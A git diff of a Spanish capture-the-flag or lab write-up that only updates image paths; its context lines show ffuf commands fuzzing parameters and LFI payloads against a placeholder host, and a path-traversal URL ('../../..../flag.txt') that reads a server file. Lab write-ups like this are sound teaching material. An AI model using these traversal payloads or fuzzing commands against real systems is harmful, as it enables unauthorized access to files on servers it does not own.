@@ -17,7 +17,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 * `-fs 2309` En mi caso se repetian múltiples parárametro con esta misma cantida de bytes por lo que oculte todas las respuestas con esa cantidad de bytes. 1️⃣0️⃣
 
 <p align="center">
-    <img src="/assets/08-Octavo/02-ffuf.PNG">
+    <img src="./assets/08-Octavo/02-ffuf.PNG">
 </p>
 
 ---
@@ -29,7 +29,7 @@ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ  -u 'http://<IP Web
 ```
 
 <p align="center">
-    <img src="/assets/08-Octavo/03-ffuf.PNG">
+    <img src="./assets/08-Octavo/03-ffuf.PNG">
 </p>
 
 ---
@@ -39,5 +39,5 @@ Con los payloads LFI ya obtenidos obtendremos el contenido del archivo `flag.txt
 * **URL:** `http://<IP Web>:<Puerto>/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt`
 
 <p align="center">
-    <img src="/assets/08-Octavo/04-flag.PNG">
+    <img src="./assets/08-Octavo/04-flag.PNG">
 </p>
